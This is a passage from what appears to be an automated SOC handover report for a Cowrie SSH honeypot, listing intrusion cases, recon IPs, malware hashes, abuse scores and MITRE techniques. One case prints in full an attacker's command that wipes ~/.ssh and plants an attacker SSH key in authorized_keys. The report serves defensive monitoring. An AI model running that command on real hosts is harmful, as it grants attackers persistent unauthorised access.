| `2026-06-23 13:15:37` | `cowrie.command.input` |
| `2026-06-23 13:15:37` | `cowrie.log.closed` |
| `2026-06-23 13:15:37` | `cowrie.session.params` |
| `2026-06-23 13:15:37` | `cowrie.command.input` |
| `2026-06-23 13:15:37` | `cowrie.log.closed` |
| `2026-06-23 13:15:37` | `cowrie.session.params` |
| `2026-06-23 13:15:37` | `cowrie.command.input` |
| `2026-06-23 13:15:38` | `cowrie.log.closed` |
| `2026-06-23 13:15:38` | `cowrie.session.params` |
| `2026-06-23 13:15:38` | `cowrie.command.input` |
| `2026-06-23 13:15:38` | `cowrie.log.closed` |
| `2026-06-23 13:15:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.46.188[.]16` to AbuseIPDB if not already reported
- [ ] Block `211.46.188[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55124c67d38b

| Field | Detail |
|---|---|
| **Source IP** | `212.115.54[.]84` |
| **First Seen** | 2026-06-23 13:36 |
| **Last Seen** | 2026-06-23 13:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 13:36:06` | `cowrie.session.connect` |
| `2026-06-23 13:36:06` | `cowrie.client.version` |
| `2026-06-23 13:36:06` | `cowrie.client.kex` |
| `2026-06-23 13:36:07` | `cowrie.login.success` |
| `2026-06-23 13:36:07` | `cowrie.session.params` |
| `2026-06-23 13:36:07` | `cowrie.command.input` |
| `2026-06-23 13:36:07` | `cowrie.command.failed` |
| `2026-06-23 13:36:07` | `cowrie.log.closed` |
| `2026-06-23 13:36:07` | `cowrie.session.params` |
| `2026-06-23 13:36:07` | `cowrie.command.input` |
| `2026-06-23 13:36:08` | `cowrie.session.file_download` |
| `2026-06-23 13:36:08` | `cowrie.log.closed` |
| `2026-06-23 13:36:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.115.54[.]84` to AbuseIPDB if not already reported
- [ ] Block `212.115.54[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfc686b760ca

| Field | Detail |
|---|---|
| **Source IP** | `212.115.54[.]84` |
| **First Seen** | 2026-06-23 13:36 |
| **Last Seen** | 2026-06-23 13:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 13:36:09` | `cowrie.session.connect` |
| `2026-06-23 13:36:09` | `cowrie.client.version` |
| `2026-06-23 13:36:10` | `cowrie.client.kex` |
| `2026-06-23 13:36:10` | `cowrie.login.success` |
| `2026-06-23 13:36:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.115.54[.]84` to AbuseIPDB if not already reported
- [ ] Block `212.115.54[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-304e8f1ca75a

| Field | Detail |
|---|---|
| **Source IP** | `82.19.12[.]103` |
| **First Seen** | 2026-06-23 13:43 |
| **Last Seen** | 2026-06-23 13:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 13:43:11` | `cowrie.session.connect` |
| `2026-06-23 13:43:12` | `cowrie.client.version` |
| `2026-06-23 13:43:12` | `cowrie.client.kex` |
| `2026-06-23 13:43:13` | `cowrie.login.success` |
| `2026-06-23 13:43:13` | `cowrie.direct-tcpip.request` |
| `2026-06-23 13:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.19.12[.]103` to AbuseIPDB if not already reported
- [ ] Block `82.19.12[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b030c095530

| Field | Detail |
|---|---|
| **Source IP** | `188.166.179[.]34` |
| **First Seen** | 2026-06-23 13:43 |
| **Last Seen** | 2026-06-23 13:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 13:43:18` | `cowrie.session.connect` |
| `2026-06-23 13:43:19` | `cowrie.client.version` |
| `2026-06-23 13:43:19` | `cowrie.client.kex` |
| `2026-06-23 13:43:21` | `cowrie.login.success` |
| `2026-06-23 13:43:21` | `cowrie.direct-tcpip.request` |
| `2026-06-23 13:43:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.166.179[.]34` to AbuseIPDB if not already reported
- [ ] Block `188.166.179[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a0eafe76ed4

| Field | Detail |
|---|---|
| **Source IP** | `60.249.251[.]88` |
| **First Seen** | 2026-06-23 14:12 |
| **Last Seen** | 2026-06-23 14:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 14:12:23` | `cowrie.session.connect` |
| `2026-06-23 14:12:24` | `cowrie.client.version` |
| `2026-06-23 14:12:24` | `cowrie.client.kex` |
| `2026-06-23 14:12:26` | `cowrie.login.success` |
| `2026-06-23 14:12:27` | `cowrie.direct-tcpip.request` |
| `2026-06-23 14:12:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.249.251[.]88` to AbuseIPDB if not already reported
- [ ] Block `60.249.251[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `59.103.104[.]255` | **25** | 2026-06-23 14:27 | 2026-06-23 14:33 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `103.181.142[.]22` | **23** | 2026-06-23 11:20 | 2026-06-23 11:30 | 0m | 23 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `135.148.33[.]168` | **15** | 2026-06-23 11:22 | 2026-06-23 12:40 | 10m | 0 | `T1592` | 🟠 MEDIUM |
| `122.244.215[.]252` | **5** | 2026-06-23 13:33 | 2026-06-23 13:42 | 9m | 0 | `T1592` | 🟢 LOW |
| `211.46.188[.]16` | **4** | 2026-06-23 13:07 | 2026-06-23 13:15 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.111[.]34` | **3** | 2026-06-23 11:36 | 2026-06-23 11:39 | 2m | 0 | `T1592` | 🟢 LOW |
| `20.171.9[.]108` | **2** | 2026-06-23 12:02 | 2026-06-23 12:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.46.228[.]199` | **2** | 2026-06-23 12:20 | 2026-06-23 12:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.131.220[.]121` | **2** | 2026-06-23 11:46 | 2026-06-23 11:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.144.78[.]28` | **2** | 2026-06-23 12:55 | 2026-06-23 12:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.11[.]137` | 1 | 2026-06-23 13:00 | 2026-06-23 13:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.154.158[.]70` | 1 | 2026-06-23 13:13 | 2026-06-23 13:13 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.39.167[.]59` | 1 | 2026-06-23 13:43 | 2026-06-23 13:43 | 8s | 0 | `T1592` | 🟢 LOW |
| `112.31.93[.]229` | 1 | 2026-06-23 12:13 | 2026-06-23 12:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.11.96[.]13` | 1 | 2026-06-23 11:50 | 2026-06-23 11:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.168.164[.]245` | 1 | 2026-06-23 11:44 | 2026-06-23 11:44 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `128.251.36[.]118` | 1 | 2026-06-23 13:11 | 2026-06-23 13:11 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.115[.]225` | 1 | 2026-06-23 12:39 | 2026-06-23 12:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.123[.]50` | 1 | 2026-06-23 11:51 | 2026-06-23 11:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `154.116.254[.]157` | 1 | 2026-06-23 11:50 | 2026-06-23 11:50 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `157.15.78[.]122` | 1 | 2026-06-23 12:12 | 2026-06-23 12:12 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.182.213[.]67` | 1 | 2026-06-23 14:55 | 2026-06-23 14:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.138.194[.]82` | 1 | 2026-06-23 13:34 | 2026-06-23 13:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `203.193.147[.]37` | 1 | 2026-06-23 12:43 | 2026-06-23 12:43 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `212.115.54[.]84` | 1 | 2026-06-23 13:36 | 2026-06-23 13:36 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.21.182[.]228` | 1 | 2026-06-23 13:58 | 2026-06-23 13:58 | 30s | 0 | `T1592` | 🟢 LOW |
| `221.226.17[.]34` | 1 | 2026-06-23 13:14 | 2026-06-23 13:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.129.37[.]92` | 1 | 2026-06-23 13:32 | 2026-06-23 13:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.164.192[.]38` | 1 | 2026-06-23 12:38 | 2026-06-23 12:38 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.32.228[.]2` | 1 | 2026-06-23 12:26 | 2026-06-23 12:28 | 116s | 0 | `T1592` | 🟢 LOW |
| `83.226.56[.]106` | 1 | 2026-06-23 13:39 | 2026-06-23 13:39 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **37/73** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 43/100 | 🟡 MEDIUM | **34/73** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/73 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 44/100 | 🟡 MEDIUM | **35/73** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `121.168.164[.]245` | KR | Korea Telecom | **100** ⚠️ | 34 |
| `3.131.220[.]121` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `120.48.111[.]34` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 4 |
| `122.244.215[.]252` | CN | CHINANET-ZJ Ningbo node network | **100** ⚠️ | 2 |
| `46.32.228[.]2` | GB | Heart Internet Ltd | **100** ⚠️ | 2 |
| `121.11.96[.]13` | CN | CHINANET Guangdong province network | **100** ⚠️ | 23 |
| `128.251.36[.]118` | IE | Microsoft Limited | **100** ⚠️ | 17 |
| `14.103.123[.]50` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `211.46.188[.]16` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `111.39.167[.]59` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 84 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 37 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 31 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 14 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 145 cases |
| Tool 34  | Credential Extractor        | ✅ 68 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 45 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (7.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 31 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 30 priority case(s) shown individually · 31 recon entry/entries in table (10 group(s) consolidating 83 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-23T14:57:02Z_
